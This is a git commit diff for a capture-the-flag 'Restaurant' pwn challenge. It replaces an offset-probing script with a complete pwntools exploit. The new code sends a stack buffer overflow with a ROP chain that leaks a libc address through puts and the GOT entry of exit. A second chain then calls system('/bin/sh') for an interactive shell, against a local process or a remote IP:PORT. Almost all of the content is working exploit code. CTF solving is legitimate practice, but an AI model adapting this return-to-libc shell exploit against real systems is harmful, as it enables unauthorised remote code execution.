384dbbfacf8bd07a6c9c30caf60b0d89ae2b98dd
herrfalco <cadet.florian@gmail.com>
2023-11-12 18:30:16 +0100

    Restaurant

--- challenges/Pwn/Restaurant/writup.py
+++ challenges/Pwn/Restaurant/writup.py
@@ -1,41 +1,58 @@
 #!/usr/bin/env python3
 
 from pwn import *
-from pprint import pprint
-from os import remove
+from sys import argv
+
+prog = ELF("./restaurant_patched")
+libc = ELF("./libc.so.6")
+offset = 40
+
+context.binary = prog
+
+def conn(ip=None, port=None):
+    if ip and port:
+        r = remote(ip, port)
+    else:
+        r = process(prog.path)
+    return r
+
+
+def main():
+    IP, PORT = None, None
+    if len(argv) == 2:
+        IP, PORT = argv[1].split(':')
+    else:
+        print("Local writup... (add IP:PORT for remote)")
+    targ = conn(IP, PORT)
+
+    info('ROP to get libc Addr:')
+    rop = ROP(prog)
+    rop.puts(prog.got['exit'])
+    rop.main()
+    print(rop.dump())
+
+    targ.sendlineafter(b'> ', b'1')
+    targ.sendlineafter(b'> ', b'\x90' * offset + rop.chain())
+
+    exit_addr = unpack(targ.readline_startswith('Enjoy')[-6:].ljust(8, b'\x00'))
+    libc_base = exit_addr - libc.sym['exit']
+    libc_system = libc_base + libc.sym['system']
+    libc_bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
+
+    warn(f'libc_base = {hex(libc_base)}')
+    warn(f'libc_system = {hex(libc_system)}')
+    warn(f'libc_bin_sh = {hex(libc_bin_sh)}')
+
+    rop = ROP(prog)
+    rop.call(rop.ret)
+    rop.call(libc_system, [libc_bin_sh])
+    rop.exit(42)
+
+    info('ROP to run a shell')
+    print(rop.dump())
+    targ.sendlineafter(b'> ', b'1')
+    targ.sendlineafter(b'> ', b'\x90' * offset + rop.chain())
+    targ.interactive()
 
 if __name__ == "__main__":
-    context.binary = 'restaurant'
-
-    prog = ELF('restaurant')
-    lib = ELF('libc.so.6')
-
-    print(prog)
-    print(lib)
-
-    print(f'rainbow @ {hex(prog.symbols["rainbow"])}')
-    offset = None
-    for i in range(32, 50):
-        with process('./restaurant') as proc:
-            proc.recvuntil(b'> ')
-            proc.sendline(b'1')
-            proc.recvuntil(b'> ')
-            proc.sendline(b'\x40' * i + pack(prog.symbols['rainbow']))
-            try:
-                print(proc.readline())
-                print(proc.readline())
-                offset = i
-                break
-            except EOFError:
-                pass
-    print(f'offset @ {offset}')
-
-    with process('./restaurant') as proc:
-        proc.recvuntil(b'> ')
-        proc.sendline(b'1')
-        proc.recvuntil(b'> ')
-        proc.sendline(b'\x40' * offset + pack(prog.symbols['rainbow']))
-        print(proc.readline())
-        print(proc.readline())
-        print(proc.readline())
-        print(proc.readline())
+    main()
